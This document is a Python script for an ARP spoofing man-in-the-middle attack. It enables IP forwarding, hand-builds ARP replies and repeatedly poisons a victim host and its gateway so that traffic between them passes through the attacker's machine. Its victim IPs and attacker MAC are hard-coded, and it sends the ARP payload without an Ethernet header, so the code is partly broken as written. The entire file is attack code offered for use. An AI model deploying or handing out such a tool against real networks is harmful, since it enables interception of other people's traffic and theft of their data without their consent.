import os
import subprocess
import struct
import socket
import time


def enable_ip_forwarding():
    """Enable IP forwarding on Linux."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[*] IP forwarding enabled.")
    except Exception as e:
        print(f"[!] Failed to enable IP forwarding: {e}")


def disable_ip_forwarding():
    """Disable IP forwarding on Linux."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print("[*] IP forwarding disabled.")
    except Exception as e:
        print(f"[!] Failed to disable IP forwarding: {e}")


def create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac):
    """Create an ARP reply packet."""
    hardware_type = 1  # Ethernet
    protocol_type = 0x0800  # IPv4
    hardware_size = 6  # MAC address length
    protocol_size = 4  # IP address length
    opcode = 2  # ARP reply

    # Construct the ARP reply
    arp_reply = struct.pack(
        "!HHBBH6s4s6s4s",
        hardware_type,
        protocol_type,
        hardware_size,
        protocol_size,
        opcode,
        bytes.fromhex(spoof_mac.replace(":", "")),  # Sender MAC
        socket.inet_aton(spoof_ip),  # Sender IP
        bytes.fromhex(target_mac.replace(":", "")),  # Target MAC
        socket.inet_aton(target_ip),  # Target IP
    )
    return arp_reply


def send_arp_spoof(iface, target_ip, target_mac, spoof_ip, spoof_mac):
    """Send crafted ARP replies to the target."""
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                         socket.htons(0x0806))
    sock.bind((iface, 0))

    arp_packet = create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac)
    sock.send(arp_packet)
    print(
        f"[*] ARP spoof sent to {target_ip} ({target_mac}) claiming to be {spoof_ip}")


def get_mac(ip):
    """Get the MAC address of a given IP."""
    output = subprocess.check_output(["arp", "-n"], encoding="utf-8")
    for line in output.splitlines():
        if ip in line:
            return line.split()[2]
    return None


def main():
    """Main function to perform ARP spoofing."""
    iface = "eth0"  # Change to your network interface
    victim_ip = "192.168.240.124"  # Victim's IP
    gateway_ip = "192.168.240.26"  # Gateway's IP

    # Get MAC addresses
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        print("[!] Failed to get MAC addresses. Ensure the targets are reachable.")
        return

    print(f"[*] Victim MAC: {victim_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")

    # Get attacker's MAC address
    attacker_mac = "08:00:27:ad:25:87"
    # get_mac(None)
    attacker_ip = socket.gethostbyname(socket.gethostname())

    print(f"[*] Attacker IP: {attacker_ip}")
    print(f"[*] Attacker MAC: {attacker_mac}")

    # Enable IP forwarding
    enable_ip_forwarding()

    try:
        print("[*] Starting ARP spoofing...")
        while True:
            # Spoof victim to think we're the gateway
            send_arp_spoof(iface, victim_ip, victim_mac,
                           gateway_ip, attacker_mac)

            # Spoof gateway to think we're the victim
            send_arp_spoof(iface, gateway_ip, gateway_mac,
                           victim_ip, attacker_mac)

            time.sleep(2)  # Repeat every 2 seconds
    except KeyboardInterrupt:
        print("\n[!] Stopping attack and restoring network...")
        disable_ip_forwarding()

        # Send legitimate ARP replies to restore the ARP tables
        send_arp_spoof(iface, victim_ip, victim_mac, gateway_ip, gateway_mac)
        send_arp_spoof(iface, gateway_ip, gateway_mac, victim_ip, victim_mac)
        print("[*] Network restored.")


if __name__ == "__main__":
    main()
